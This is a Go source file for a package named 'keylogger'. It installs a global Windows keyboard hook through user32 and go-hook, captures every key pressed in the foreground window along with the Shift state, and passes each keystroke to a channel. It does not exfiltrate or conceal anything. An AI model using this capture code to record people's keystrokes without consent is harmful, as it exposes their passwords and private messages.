package keylogger

import (
	"fmt"
	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/types"
	"golang.org/x/sys/windows"
	"keyboard/objects"
	"os"
	"os/signal"
)

var (
	mod = windows.NewLazyDLL("user32.dll")

	procGetKeyState       = mod.NewProc("GetKeyState")
	procGetKeyboardLayout = mod.NewProc("GetKeyboardLayout")
	procGetKeyboardState  = mod.NewProc("GetKeyboardState")
	procToUnicodeEx       = mod.NewProc("ToUnicodeEx")

	shiftPressed bool = false
)

// getForegroundWindow gets current foreground window.
func getForegroundWindow() uintptr {
	proc := mod.NewProc("GetForegroundWindow")
	hwnd, _, _ := proc.Call()
	return hwnd
}

// KeyLogger starts key-logging the keyboard, sending all pressed keys to the received keyOut objects.Letter channel.
func KeyLogger(keyOut chan objects.Letter, logKeys chan bool) error {
	// Buffer size is depended on your need. The 100 is a placeholder value.
	keyboardChan := make(chan types.KeyboardEvent, 100)
	if err := keyboard.Install(nil, keyboardChan); err != nil {
		return err
	}
	defer keyboard.Uninstall()

	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	fmt.Println("keylogger: Start capturing keyboard input...")
	for {
		select {
		case <-signalChan:
			fmt.Println("keylogger: Received shutdown signal")
			return nil
		case <-logKeys:
			fmt.Println("keylogger: Controller stopped the key-logging go routine")
			return nil
		case k := <-keyboardChan:
			keyPressed(keyOut, k)
		}
	}
}

// keyPressed checks what key was pressed on the users keyboard, then is passes the inputted key via the keyOut
// received objects.Letter channel.
// Additionally check if types.VK_SHIFT was pressed and released to update the shiftPressed variable.
func keyPressed(keyOut chan objects.Letter, key types.KeyboardEvent) {
	if hwnd := getForegroundWindow(); hwnd != 0 {
		if key.Message == types.WM_KEYDOWN {
			if key.VKCode == types.VK_LSHIFT || key.VKCode == types.VK_RSHIFT {
				shiftPressed = true
				return
			}
			keyOut <- createLetter(key)
		} else if key.Message == types.WM_KEYUP {
			if key.VKCode == types.VK_LSHIFT || key.VKCode == types.VK_RSHIFT {
				shiftPressed = false
			}
		}
	}
}

// createLetter return an objects.Letter object containing the current state of the keyboard.
func createLetter(key types.KeyboardEvent) objects.Letter {
	return objects.Letter{
		KeyboardEvent: key,
		Capitalized:   shiftPressed,
	}
}
